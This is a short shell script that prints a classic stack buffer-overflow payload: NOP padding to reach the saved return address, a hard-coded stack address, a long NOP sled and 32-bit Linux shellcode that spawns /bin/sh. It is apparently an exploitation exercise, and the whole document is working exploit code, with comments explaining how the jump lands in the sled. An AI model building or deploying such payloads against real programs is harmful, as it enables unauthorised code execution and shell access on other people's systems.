#!/bin/sh

shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
address="\x50\xd5\xff\xff"   #
padding=$(printf '\x90%.0s' {1..24})   #padding to fill until retaddr
nopsled=$(printf '\x90%.0s' {1..250})  #big nopsled
echo -en "$padding$address$nopsled$shellcode"  #padding then addr to jump into nops then slide to code